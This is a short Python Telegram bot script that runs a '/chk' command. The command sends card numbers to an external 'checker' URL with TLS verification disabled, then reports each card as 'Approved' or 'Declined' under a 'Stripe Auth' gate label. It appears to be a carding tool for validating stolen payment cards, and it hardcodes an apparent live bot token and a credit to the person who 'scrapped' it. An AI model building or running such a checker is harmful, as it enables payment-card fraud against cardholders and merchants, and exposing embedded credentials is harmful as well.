import requests
import json

bot_token = "8354463122:AAF9nR5ePOHFdGYPUPglqypAraar-CqH6PY"
checker_url = "https://test.infinitemsfeed.com/chk.php?lista="

BOT_CREDIT = "@abinjmoffical"


def send_message(chat_id, text, reply_to=None):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    if reply_to:
        params["reply_to_message_id"] = reply_to

    r = requests.get(url, params=params)
    return r.json().get("result", {}).get("message_id")


def edit_message(chat_id, message_id, new_text):
    url = f"https://api.telegram.org/bot{bot_token}/editMessageText"
    params = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": new_text,
        "parse_mode": "HTML"
    }
    requests.get(url, params=params)


def process_update(update):
    if "message" not in update:
        return

    chat_id = update["message"]["chat"]["id"]
    message_id = update["message"]["message_id"]
    text = update["message"].get("text", "")

    if not text.startswith("/chk"):
        return

    wait_msg = send_message(chat_id, "Checking... Card", message_id)

    cc = text.replace("/chk", "").strip()
    if not cc:
        edit_message(chat_id, wait_msg, "Please provide a valid card.")
        return

    try:
        response_api = requests.get(checker_url + cc, verify=False, timeout=15)
        result = response_api.json()
    except Exception as e:
        result = {"error": str(e)}

    response = ""

    if "success" in result:

        if result["success"] is True:
            response += "𝗦𝘁𝗮𝘁𝘂𝘀 - Approved ✅\n"
            response += "━━━━━━━━━━━━━\n"
            response += f"[ϟ] 𝗖𝗖 ⌁ {cc}\n"
            response += f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {result.get('message', 'Approved')} ✅\n"
            response += "[ϟ] 𝗚𝗮𝘁𝗲 - Stripe Auth\n"
            response += "━━━━━━━━━━━━━\n"
            response += f"[ϟ] 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗱 𝗕𝘆 : {BOT_CREDIT}\n"

        else:
            response += "𝗦𝘁𝗮𝘁𝘂𝘀 - 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌\n"
            response += "━━━━━━━━━━━━━\n"
            response += f"[ϟ] 𝗖𝗖 ⌁ {cc}\n"
            response += f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {result.get('message', 'Declined')} ❌\n"
            response += "[ϟ] 𝗚𝗮𝘁𝗲 - Stripe Auth\n"
            response += "━━━━━━━━━━━━━\n"
            response += f"[ϟ] 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗱 𝗕𝘆 : {BOT_CREDIT}\n"

    else:
        response += "𝗦𝘁𝗮𝘁𝘂𝘀 - ERROR ❌\n"
        response += "━━━━━━━━━━━━━\n"
        response += f"[ϟ] X Error: {result.get('error', 'Unknown error')}\n"

    edit_message(chat_id, wait_msg, response)


# Example test
update = json.loads(
    '{"message": {"chat": {"id": 123456789}, "message_id": 1, "text": "/chk 1234567890123456"}}'
)
process_update(update)